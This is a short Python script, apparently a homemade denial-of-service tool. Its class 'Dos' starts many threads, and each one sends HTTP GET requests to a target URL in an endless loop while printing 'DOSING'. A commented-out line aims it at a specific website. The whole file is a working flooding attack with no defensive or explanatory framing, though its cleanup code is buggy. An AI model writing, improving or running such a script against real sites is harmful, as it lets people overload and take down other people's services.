import requests
import threading 
import time
import sys
import signal
import os
import psutil


class Dos():
    
    def currentMilliTime(self):
        return round(time.time() * 1000)

    def kill_child_processes(parent_pid, sig=signal.SIGTERM):
        try:
            parent = psutil.Process(parent_pid)
        except psutil.NoSuchProcess:
            return
        children = parent.children(recursive=True)
        print('Process Killed!')
        for process in children:
            process.send_signal(sig)
    
    

    def makeAProperExit(self):
        self.lock.release()
        self.kill_child_processes(self.pid)
        sys.exit(0)

    def makeRequest(self,name):#name->threadId
        try:
            while True:
                s=self.currentMilliTime()
                r =requests.get(self.target)
                t=self.currentMilliTime() - s
                print("DOSING")
            
        except (KeyboardInterrupt, SystemExit):
            self.makeAProperExit()
            

    def __init__(self,noOfThread,url):
        self.lock = threading.Lock()
        self.pid = os.getpid()
        self.noOfThread = noOfThread
        self.target=url
        i=0
        print(self.noOfThread)
        print(url)
        while i<=noOfThread:
            x=threading.Thread(target=self.makeRequest,args=(i,))
            x.start()
            i+=1

#a=Dos(2,"https://karthik.selfmade.lol/")